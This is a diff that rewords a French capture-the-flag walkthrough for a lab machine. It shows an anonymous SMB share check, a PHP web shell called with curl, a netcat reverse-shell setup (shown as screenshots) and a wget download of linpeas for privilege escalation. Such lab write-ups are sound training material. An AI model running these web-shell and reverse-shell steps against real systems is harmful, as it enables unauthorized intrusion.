@@ -82,7 +82,7 @@ smbclient //192.168.188.214/icecream -N
 ![image9](https://github.com/user-attachments/assets/f50dd2e9-d504-4395-a02a-986c214d73b1)
 ![image1](https://github.com/user-attachments/assets/b5c39a4a-6de5-40d2-bf67-71b3fcb81223)
 
-📌 **Constat :**  
+📌 **Constat :**
 ✅ Accès en écriture confirmé.  
 
 ## 4. Exploitation et Accès à la Machine
@@ -111,29 +111,38 @@ curl "http://192.168.188.214/shell.php?cmd=id"
 
 ![image25](https://github.com/user-attachments/assets/776c46b5-38c4-449b-87dd-4eba64c88dbf)
 
-Maintenant on doit démarrer netcat et attendre que la cible nous communique.
+Nous devons maintenant démarrer **Netcat** et attendre que la cible nous envoie une connexion.
 
 ![image26](https://github.com/user-attachments/assets/73f39262-64fe-48bb-9893-cedda1799338)
 
-Donc on retrouve sur la cible et on va lancer :
+Ensuite, nous retournons sur la cible et exécutons la commande suivante :
 
 ![image24](https://github.com/user-attachments/assets/408ac94e-5ca4-4b4e-b3d2-523f2ed20d7f)
 
-Ce qui va nous permettre de nous connecter :
+Ce qui nous permettra d'établir une connexion :
 
 ![image15](https://github.com/user-attachments/assets/1547e4f5-ec92-4054-9588-024d8e1f4fd2)
 
-Nous allons passer sur un shell interactif via la commande :
+Nous passons maintenant en **shell interactif** à l’aide de la commande :
 
 ![image13](https://github.com/user-attachments/assets/08a0f85a-f8db-4fa4-8603-dce39ef70004)
 ![image20](https://github.com/user-attachments/assets/ec2caedc-964e-4160-bdb8-f7f4a2cc8a99)
 
-Nous allons tester les identifiants avec les outils Linpeas :
+### 🔎 Identification des failles avec **Linpeas**  
+Nous allons tester les identifiants en utilisant **Linpeas**, un script qui analyse automatiquement le système pour détecter des vulnérabilités d’élévation de privilèges.  
 
-linpeas.sh est un script qui analyse automatiquement le système pour détecter des failles d’élévation de privilèges. Il recherche des fichiers avec des permissions spéciales, des mots de passe cachés, des tâches cron vulnérables ou des services mal configurés qui pourraient permettre de devenir root. C’est un outil très pratique pour automatiser la découverte des vulnérabilités après avoir obtenu un premier accès sur une machine Linux.
+📌 **Linpeas** permet de trouver :  
+- **Des fichiers avec des permissions spéciales**  
+- **Des mots de passe cachés**  
+- **Des tâches cron vulnérables**  
+- **Des services mal configurés pouvant mener à une escalade de privilèges**  
 
-On peut récupérer cette outil de cette manière :
-linpeas.sh :
+C’est un outil très efficace pour automatiser la **découverte de vulnérabilités** après l’obtention d’un premier accès sur une machine Linux.  
+
+---
+
+### 📥 Installation de Linpeas  
+Nous pouvons récupérer l’outil avec la commande suivante :
 
 ```bash
 wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
